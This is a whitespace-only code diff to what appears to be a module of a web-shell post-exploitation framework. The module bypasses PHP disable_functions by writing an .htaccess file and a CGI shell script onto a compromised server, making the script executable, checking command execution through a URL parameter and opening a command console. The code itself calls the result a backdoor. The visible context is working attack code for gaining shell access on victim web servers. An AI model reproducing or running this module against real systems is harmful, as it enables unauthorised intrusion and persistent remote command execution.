@@ -30,7 +30,7 @@ class Disablefunctionbypass(Module):
             { 'name' : '-script', 'help' : 'CGI script to upload', 'default' : os.path.join(self.folder, 'cgi.sh') },
             { 'name' : '-just-run', 'help' : 'Skip install and run shell through URL' },
         ])
-        
+
         self.register_vectors( [
             PhpCode(
                 """(is_callable('apache_get_modules')&&in_array('mod_cgi', apache_get_modules())&&print(1))||print(0);""",
@@ -56,24 +56,24 @@ class Disablefunctionbypass(Module):
                 'file_rm', 
                 [ '${path}' ],
                 name = 'remove'
-            ),             
+            ),
         ])
 
     def _clean(self, htaccess_absolute_path, script_absolute_path):
-        
+
         log.warning('Deleting %s and %s' % (htaccess_absolute_path, script_absolute_path))
         self.vectors.get_result('remove', format_args = { 'path': htaccess_absolute_path })
-        self.vectors.get_result('remove', format_args = { 'path': script_absolute_path })    
+        self.vectors.get_result('remove', format_args = { 'path': script_absolute_path })
 
     def _install(self):
-        
+
         if not self.vectors.get_result('mod_cgi'):
             log.warning(messages.module_audit_disablefunctionbypass.error_mod_cgi_disabled)
             return
-                
+
         filename = strings.randstr(5, charset = string.ascii_lowercase)
         ext = strings.randstr(3, charset = string.ascii_lowercase)
-        
+
         result_install_htaccess = self.vectors.get_result(
             'install_htaccess', 
             format_args = { 'extension': ext }
@@ -85,23 +85,23 @@ class Disablefunctionbypass(Module):
             ):
             log.warning(messages.module_audit_disablefunctionbypass.error_installing_htaccess)
             return
-        
+
         htaccess_absolute_path = result_install_htaccess[0][0]
         script_absolute_path = '%s.%s' % (htaccess_absolute_path.replace('.htaccess', filename), ext)
         script_url = '%s.%s' % (
             result_install_htaccess[0][1].replace('.htaccess', filename), 
             ext
         )
-        
+
         result_install_script = self.vectors.get_result(
-            'install_script', 
+            'install_script',
             format_args = { 'script' : self.args.get('script'), 'rpath': script_absolute_path }
         )
         if not result_install_script:
             log.warning(messages.module_audit_disablefunctionbypass.error_uploading_script_to_s % script_absolute_path)
             self._clean(htaccess_absolute_path, script_absolute_path)
             return
-        
+
         result_chmod = self.vectors.get_result(
             'chmod', 
             format_args = { 'rpath': script_absolute_path }
@@ -114,7 +114,7 @@ class Disablefunctionbypass(Module):
         if not self._check_response(script_url):
             log.warning(messages.module_audit_disablefunctionbypass.error_s_unexpected_output % (script_url))
             self._clean(htaccess_absolute_path, script_absolute_path)
-            return           
+            return
 
         log.warning(messages.module_audit_disablefunctionbypass.cgi_installed_remove_s_s % (htaccess_absolute_path, script_absolute_path))
         log.warning(messages.module_audit_disablefunctionbypass.run_s_skip_reinstalling % (script_url))
@@ -122,15 +122,15 @@ class Disablefunctionbypass(Module):
         return script_url
 
     def _check_response(self, script_url):
-        
+
         script_query = '%s?c=' % (script_url)
         query_random_str = strings.randstr(5)
         command_query = '%secho%%20%s' % (script_query, query_random_str)
-        
+
         result_request = http.request(command_query)
-        
+
         return query_random_str in result_request
-         
+
 
     def run(self):
 
@@ -138,7 +138,7 @@ class Disablefunctionbypass(Module):
         if self.session['shell_sh']['status'] == Status.RUN:
             log.warning(messages.module_audit_disablefunctionbypass.error_sh_commands_enabled)
             return
-        
+
         # Install if -just-run option hasn't been provided, else directly check the backdoor
         script_url = self.args.get('just_run')
         if not script_url:
@@ -148,7 +148,7 @@ class Disablefunctionbypass(Module):
         elif not self._check_response(script_url):
                 log.warning(messages.module_audit_disablefunctionbypass.error_s_unexpected_output % (script_url))
                 return
-            
+
         log.warning(messages.module_audit_disablefunctionbypass.requests_not_obfuscated)
 
         # Console loop
